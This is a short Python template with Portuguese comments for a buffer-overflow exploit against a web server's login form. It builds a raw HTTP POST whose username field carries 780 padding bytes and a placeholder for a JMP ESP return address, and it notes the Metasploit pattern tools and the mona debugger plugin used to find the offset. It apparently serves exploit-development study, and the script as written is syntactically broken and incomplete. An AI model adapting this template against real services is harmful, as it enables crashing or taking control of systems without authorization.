#Criar request do burp com \r\n em todas linhas
#request+= em cada linha
#!/usr/bin/python3

import socket

#msf-pattern_create -l 1000, seguido de msf-pattern_offset -l 1000 -q XX
dados = "A" * 780 + #"JMP EST hex" + "C" * (1200-768)  

#Pode usar !mona findmsp no debugger
tamanho=len(dados) + 20 #20 = content-length original

request="POST / HTTP/1.1\r\n"
request+="Host...\r\n"
request+="User-agent...\r\n"
request+="Accept:...\r\n"
request+="...\r\n"
request+="Content-Length: "+str(tamanho)+"\r\n"
request+="username="+dados+"&password=A"

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ip",port))
s.send(request)
